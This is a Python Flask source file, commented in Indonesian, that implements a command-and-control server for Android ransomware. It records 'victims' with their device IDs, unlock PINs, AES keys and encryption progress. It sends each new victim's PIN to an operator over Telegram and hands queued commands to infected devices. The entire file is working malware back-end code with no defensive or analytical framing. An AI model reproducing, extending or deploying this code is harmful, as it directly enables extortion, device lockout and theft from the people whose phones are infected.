import os
import json
import sqlite3
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import requests

# ========== KONFIGURASI ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "")
PORT = int(os.environ.get("PORT", 8080))

# ========== DATABASE ==========
DB_PATH = "c2_data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        device_id TEXT PRIMARY KEY,
        pin TEXT,
        aes_key TEXT,
        model TEXT,
        android_version TEXT,
        first_seen TEXT,
        last_active TEXT,
        progress INTEGER DEFAULT 0,
        is_locked INTEGER DEFAULT 1,
        status TEXT DEFAULT 'encrypted'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        command TEXT,
        issued_at TEXT,
        executed INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()

init_db()

# ========== FLASK APP ==========
app = Flask(__name__)

# ========== FUNGSI KIRIM TELEGRAM (SYNC, PAKAI REQUESTS) ==========
def send_telegram(text):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        print("BOT_TOKEN or ADMIN_CHAT_ID not set")
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Telegram error:", e)

# ========== ENDPOINTS ==========
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400
    
    device_id = data.get('device_id')
    pin = data.get('pin')
    aes_key = data.get('aes_key')
    model = data.get('model')
    android_version = data.get('android_version')
    
    if not device_id:
        return jsonify({"error": "device_id required"}), 400
    
    now = datetime.now().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
        (device_id, pin, aes_key, model, android_version, first_seen, last_active, is_locked)
        VALUES (?, ?, ?, ?, ?, ?, ?, 1)''',
        (device_id, pin, aes_key, model, android_version, now, now))
    conn.commit()
    conn.close()
    
    # Kirim notifikasi ke Telegram (synchronous, pakai thread biar tidak blocking)
    threading.Thread(target=send_telegram, args=(f"🔴 *NEW VICTIM*\n\nDevice ID: `{device_id}`\nPIN: `{pin}`\nModel: {model}\nTime: {now}",)).start()
    
    return jsonify({"status": "ok"})

@app.route('/status', methods=['POST'])
def status():
    data = request.get_json()
    device_id = data.get('device_id')
    progress = data.get('progress')
    is_locked = data.get('is_locked')
    
    if not device_id:
        return jsonify({"error": "device_id required"}), 400
    
    now = datetime.now().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''UPDATE victims SET last_active=?, progress=?, is_locked=?
                 WHERE device_id=?''', (now, progress, is_locked, device_id))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/command/<device_id>', methods=['GET'])
def get_command(device_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT command FROM commands 
                 WHERE device_id=? AND executed=0
                 ORDER BY id ASC LIMIT 1''', (device_id,))
    row = c.fetchone()
    if row:
        command = row[0]
        c.execute('UPDATE commands SET executed=1 WHERE device_id=? AND command=?', (device_id, command))
        conn.commit()
        conn.close()
        return jsonify({"command": command})
    conn.close()
    return jsonify({"command": None})

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
